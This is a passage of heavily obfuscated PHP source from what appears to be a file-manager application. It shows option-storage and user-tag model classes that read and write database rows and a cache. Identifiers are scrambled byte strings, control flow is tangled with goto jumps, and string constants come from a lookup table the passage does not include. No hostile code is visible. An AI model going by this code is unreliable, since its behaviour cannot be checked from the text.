$cÀÅâ¨…ÆÏ = array_filter(array_values($cÀÅâ¨…ÆÏ)); return array_sort_by($cÀÅâ¨…ÆÏ, $c§ºí°ÙÂé, $CØÌ‹³Ûò‘); } return $cÀÅâ¨…ÆÏ[$_SERVER[¯Ò¬Èè][364] . $BôÎ“ÜĞÌ£]; } public function insert($d‰Õğíí´) { goto A²ª¸í³È; A²ª¸í³È: $cÏ’ƒâ†«Ù =& $_SERVER[¯Ò¬Èè]; $d‰Õğíí´ = array_field_key($d‰Õğíí´, $this->field); $eœŸ¾ÇÌç = Model($this->modelType)->get($cÏ’ƒâ†«Ù[365], $this->optionType . $cÏ’ƒâ†«Ù[366]); goto D‡·–óª†; D‡·–óª†: $eœŸ¾ÇÌç = $eœŸ¾ÇÌç ? $eœŸ¾ÇÌç : 0; $d‰Õğíí´[$cÏ’ƒâ†«Ù[367]] = ++$eœŸ¾ÇÌç; $d‰Õğíí´[$cÏ’ƒâ†«Ù[187]] = time(); goto fÆ§—±ÎËñ; fÆ§—±ÎËñ: $d‰Õğíí´[$cÏ’ƒâ†«Ù[107]] = time(); Model($this->modelType)->set($cÏ’ƒâ†«Ù[365], $eœŸ¾ÇÌç, $this->optionType . $cÏ’ƒâ†«Ù[366]); Model($this->modelType)->set($cÏ’ƒâ†«Ù[364] . $eœŸ¾ÇÌç, $d‰Õğíí´, $this->optionType); goto B®ğƒ¡Ûò«; B®ğƒ¡Ûò«: return $eœŸ¾ÇÌç; goto EâáÍŒÎßÕ; EâáÍŒÎßÕ: } public function update($CÎ­éË¦ˆ, $Dó£òË¤ó) { goto F¯£¹İªšÑ; díÊ®Ì†ò: return Model($this->modelType)->set($f™†‚Úò¥[364] . $CÎ­éË¦ˆ, $Dó£òË¤ó, $this->optionType); goto c´¿¦ßóÆ; f±òï­‡‘Û: if (!$FÚ¡¯šƒá„) { return !1; } $Dó£òË¤ó = array_merge($FÚ¡¯šƒá„, $Dó£òË¤ó); $Dó£òË¤ó[$f™†‚Úò¥[107]] = time(); goto díÊ®Ì†ò; F¯£¹İªšÑ: $f™†‚Úò¥ =& $_SERVER[¯Ò¬Èè]; $Dó£òË¤ó = array_field_key($Dó£òË¤ó, $this->field); $FÚ¡¯šƒá„ = $this->listData($CÎ­éË¦ˆ); goto f±òï­‡‘Û; c´¿¦ßóÆ: } public function remove($BÒÆİöâÌ) { return Model($this->modelType)->remove($_SERVER[¯Ò¬Èè][364] . $BÒÆİöâÌ, $this->optionType); } public function clear() { $f…àöë‘ç =& $_SERVER[¯Ò¬Èè]; Model($this->modelType)->remove($f…àöë‘ç[365], $this->optionType . $f…àöë‘ç[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($cš¢¢í“é”, $f‡Óé¤Ğ÷ç) { if (!$f‡Óé¤Ğ÷ç) { return !1; } $Aö§Š¶Áš½ = $this->listData(); $Aö§Š¶Áš½ = array_to_keyvalue($Aö§Š¶Áš½, $cš¢¢í“é”); return isset($Aö§Š¶Áš½[$f‡Óé¤Ğ÷ç]) ? $Aö§Š¶Áš½[$f‡Óé¤Ğ÷ç] : !1; } public function findByName($Føãßò½õ) { return $this->findByKey($_SERVER[¯Ò¬Èè][28], $Føãßò½õ); } protected function resetData($fÄÆ¡‚ÉÓœ) { $F»ìã¨ášõ =& $_SERVER[¯Ò¬Èè]; $fÄÆ¡‚ÉÓœ = is_array($fÄÆ¡‚ÉÓœ) ? $fÄÆ¡‚ÉÓœ : array(); $a—î˜‘“’ = array(); for ($E½â¦ƒ¦¤ = 0; $E½â¦ƒ¦¤ < count($fÄÆ¡‚ÉÓœ); $E½â¦ƒ¦¤++) { $a—î˜‘“’[$F»ìã¨ášõ[364] . $fÄÆ¡‚ÉÓœ[$E½â¦ƒ¦¤][$F»ìã¨ášõ[367]]] = $fÄÆ¡‚ÉÓœ[$E½â¦ƒ¦¤]; } return Model($this->modelType)->set($a—î˜‘“’, !1, $this->optionType); } private function getAutoName($E¯æêÈ£±) { $F›…íŒ¾… = array_to_keyvalue($this->listData(), $_SERVER[¯Ò¬Èè][28]); if (!$F›…íŒ¾… || !isset($F›…íŒ¾…[$E¯æêÈ£±])) { return $E¯æêÈ£±; } for ($eˆ¦¡æÚŒä = 1; $eˆ¦¡æÚŒä < count($F›…íŒ¾…); $eˆ¦¡æÚŒä++) { $cæšÍß·÷ï = $E¯æêÈ£± . "\50{$eˆ¦¡æÚŒä}\x29"; if (!isset($F›…íŒ¾…[$cæšÍß·÷ï])) { return $cæšÍß·÷ï; } } return $cæšÍß·÷ï; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($AÎİ¦çÌº† = false, $b¯Æó®‰£ö = '', $b¶œéµø˜˜ = false) { goto fˆ…¸‘È¯İ; Cº§¿…ô¢¢: $F‰ŒœÊ ÚÈ = is_array($F‰ŒœÊ ÚÈ) ? $F‰ŒœÊ ÚÈ : array(); if (is_array($d¾ãìêš‘Ÿ)) { $d¾ãìêš‘Ÿ = array_merge($F‰ŒœÊ ÚÈ, $d¾ãìêš‘Ÿ); return $AÎİ¦çÌº† ? isset($d¾ãìêš‘Ÿ[$AÎİ¦çÌº†]) ? $d¾ãìêš‘Ÿ[$AÎİ¦çÌº†] : null : $d¾ãìêš‘Ÿ; } $CÛ¿†£Ç†š = $this->filterWhere(array($d´”Úíš¨²[29] => $b¯Æó®‰£ö)); goto e¬À•á¼É¬; DäÙø®À§: $this->cacheSet($b¯Æó®‰£ö, $d¾ãìêš‘Ÿ); $d¾ãìêš‘Ÿ = array_merge($F‰ŒœÊ ÚÈ, $d¾ãìêš‘Ÿ); return $AÎİ¦çÌº† ? $d¾ãìêš‘Ÿ[$AÎİ¦çÌº†] : $d¾ãìêš‘Ÿ; goto d´¥ØÂ”â; e¬À•á¼É¬: $d¾ãìêš‘Ÿ = $this->where($CÛ¿†£Ç†š)->select(); $d¾ãìêš‘Ÿ = array_to_keyvalue($d¾ãìêš‘Ÿ, $d´”Úíš¨²[89], $d´”Úíš¨²[359]); foreach ($d¾ãìêš‘Ÿ as $eŒµõÇƒ¡£ => $eàßñõ‚ˆæ) { if ($b¶œéµø˜˜ || in_array($eŒµõÇƒ¡£, $this->jsonField)) { $d¾ãìêš‘Ÿ[$eŒµõÇƒ¡£] = json_decode($eàßñõ‚ˆæ, !0); } } goto DäÙø®À§; fˆ…¸‘È¯İ: $d´”Úíš¨² =& $_SERVER[¯Ò¬Èè]; $d¾ãìêš‘Ÿ = $this->cacheGet($b¯Æó®‰£ö); $F‰ŒœÊ ÚÈ = $this->optionDefault($b¯Æó®‰£ö); goto Cº§¿…ô¢¢; d´¥ØÂ”â: } public function set($EäÜ¹ŒÈÆ, $a£„Ğ¯Èµ· = false, $fºœƒµŞ‡ò = '') { goto aÓŒß×´–‘; E÷˜¤èàĞ: $B×†Óê¸¨Ê = is_array($EäÜ¹ŒÈÆ) ? $EäÜ¹ŒÈÆ : array($EäÜ¹ŒÈÆ => $a£„Ğ¯Èµ·); foreach ($B×†Óê¸¨Ê as $CÁÅ­†˜” => $cŞÌÁİˆÚ²) { if (is_array($cŞÌÁİˆÚ²)) { $cŞÌÁİˆÚ² = json_encode_force($cŞÌÁİˆÚ²); } $this->checkLength($cŞÌÁİˆÚ², !1, $this->tableName . $b‹îñ‚»¡„[4] . $EäÜ¹ŒÈÆ); $cŞÌÁİˆÚ² = self::textEncode($cŞÌÁİˆÚ²); $B×†Óê¸¨Ê = array($b‹îñ‚»¡„[29] => $fºœƒµŞ‡ò, $b‹îñ‚»¡„[89] => $CÁÅ­†˜”, $b‹îñ‚»¡„[359] => $cŞÌÁİˆÚ²); $céˆß÷¦éè[] = $this->filterWhere($B×†Óê¸¨Ê); } if (!$céˆß÷¦éè) { return !0; } goto eÆ×†‹º°£; aÓŒß×´–‘: $b‹îñ‚»¡„ =& $_SERVER[¯Ò¬Èè]; $this->cacheRemove($fºœƒµŞ‡ò); $céˆß÷¦éè = array(); goto E÷˜¤èàĞ; eÆ×†‹º°£: return $this->addAll($céˆß÷¦éè, array(), !0); goto dÕĞÛÖÚÜ; dÕĞÛÖÚÜ: } protected function optionDefault($dêŒÙ†Œ¹ã = '') { return !1; } public function setDeep($BÍá¤èˆ‹, $a’½£ìÈ˜ = false, $Fññ»Í»ù† = '') { $aæ¤ÖÏÆ‚ = explode($_SERVER[¯Ò¬Èè][91], $BÍá¤èˆ‹); $fØœ³ÏˆË“ = $this->get(); array_set_value($fØœ³ÏˆË“, $BÍá¤èˆ‹, $a’½£ìÈ˜); $this->set($aæ¤ÖÏÆ‚[0], $fØœ³ÏˆË“[$aæ¤ÖÏÆ‚[0]], $Fññ»Í»ù†); } public function remove($Cá¤É¨Ûó½, $aˆÈ’ ‚ˆí = '') { $cÙ³£î‡ =& $_SERVER[¯Ò¬Èè]; $this->cacheRemove($aˆÈ’ ‚ˆí); $FãÒˆ—× = $this->filterWhere(array($cÙ³£î‡[89] => $Cá¤É¨Ûó½, $cÙ³£î‡[29] => $aˆÈ’ ‚ˆí)); if (is_null($Cá¤É¨Ûó½)) { unset($FãÒˆ—×[$cÙ³£î‡[89]]); } return $this->where($FãÒˆ—×)->delete(); } public function cacheSet($fÙÒƒ«Ó–¥, $A±˜ìšñÀ = false) { return Cache::set($this->cacheKey($fÙÒƒ«Ó–¥), $A±˜ìšñÀ); } public function cacheGet($F’‹Å¯ô£¥) { return Cache::get($this->cacheKey($F’‹Å¯ô£¥)); } public function cacheRemove($c‚œ¢â«…) { return Cache::remove($this->cacheKey($c‚œ¢â«…)); } protected function filterWhere($AóÈÒµ³ëˆ) { return $AóÈÒµ³ëˆ; } protected function cacheKey($bÙ‚ÑƒÛ§) { return $bÙ‚ÑƒÛ§; } } goto e™—î¿¥œ; cƒÆæ¿Áì: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($cÏÂÏğôãÁ) { $B´è¨—çî¨ =& $_SERVER[¯Ò¬Èè]; return array($B´è¨—çî¨[2496] => array(USER_ID, $B´è¨—çî¨[2551])); } protected function listData() { $F‡ê‹·„¸“ =& $_SERVER[¯Ò¬Èè]; $D•ˆè­ø°³ = array($F‡ê‹·„¸“[1437] => USER_ID, $F‡ê‹·„¸“[436] => array($F‡ê‹·„¸“[2552], 0)); $DÔÀÎ¼Ø¹ò = $F‡ê‹·„¸“[2553]; $e­Å¦í… = $F‡ê‹·„¸“[2554]; $Fñ¿÷Ÿ›’ = $this->field($DÔÀÎ¼Ø¹ò)->where($D•ˆè­ø°³)->order($e­Å¦í…)->select(); return $Fñ¿÷Ÿ›’ ? $Fñ¿÷Ÿ›’ : array(); } protected function listByTag($aÔèÆìÀ¡Ì) { } protected function addToTag($cÑÊ¬‹Ğ°ç, $B¹µ”ß§àÎ) { $d£ÅÎî‘Åö =& $_SERVER[¯Ò¬Èè]; if (!Model($d£ÅÎî‘Åö[2324])->listData($B¹µ”ß§àÎ) || !Model($d£ÅÎî‘Åö[767])->pathInfo($cÑÊ¬‹Ğ°ç)) { return !1; } $Eê²¨çšå = array($d£ÅÎî‘Åö[1437] => USER_ID, $d£ÅÎî‘Åö[436] => $B¹µ”ß§àÎ, $d£ÅÎî‘Åö[387] => $cÑÊ¬‹Ğ°ç, $d£ÅÎî‘Åö[388] => $d£ÅÎî‘Åö[382], $d£ÅÎî‘Åö[386] => $d£ÅÎî‘Åö[33], $d£ÅÎî‘Åö[2118] => 0); if ($this->where($Eê²¨çšå)->find()) { return !1; } return $this->add($Eê²¨çšå); } protected function removeFromTag($cêåËÈ÷”°, $Eê´Å¥‚Ÿ) { $cìäœ´ä‹ù =& $_SERVER[¯Ò¬Èè]; if (!Model($cìäœ´ä‹ù[2324])->listData($Eê´Å¥‚Ÿ)) { return !1; } if (is_array($cêåËÈ÷”°)) { $cêåËÈ÷”° = array($cìäœ´ä‹ù[7], $cêåËÈ÷”°); } $Dëàò”¶ÇÙ = array($cìäœ´ä‹ù[1437] => USER_ID, $cìäœ´ä‹ù[436] => $Eê´Å¥‚Ÿ, $cìäœ´ä‹ù[388] => $cìäœ´ä‹ù[382], $cìäœ´ä‹ù[387] => $cêåËÈ÷”°); return $this->where($Dëàò”¶ÇÙ)->delete(); } protected function removeByTag($cÆ±»Û¨³) { $aÌÌ¥õë =& $_SERVER[¯Ò¬Èè]; if (!$cÆ±»Û¨³) { return !1; } $a‹‰†ôººÌ = array($aÌÌ¥õë[1437] => USER_ID, $aÌÌ¥õë[436] => $cÆ±»Û¨³); return $this->where($a‹‰†ôººÌ)->delete(); } protected function removeBySource($Fø»çéôÍ) { $aÙ˜ßõ‹ÖÎ =& $_SERVER[¯Ò¬Èè]; $fÕòÆÔğÏå = array($aÙ˜ßõ‹ÖÎ[1437] => USER_ID, $aÙ˜ßõ‹ÖÎ[387] => $Fø»çéôÍ, $aÙ˜ßõ‹ÖÎ[436] => array($aÙ˜ßõ‹ÖÎ[937], 0)); return $this->where($fÕòÆÔğÏå)->delete(); } }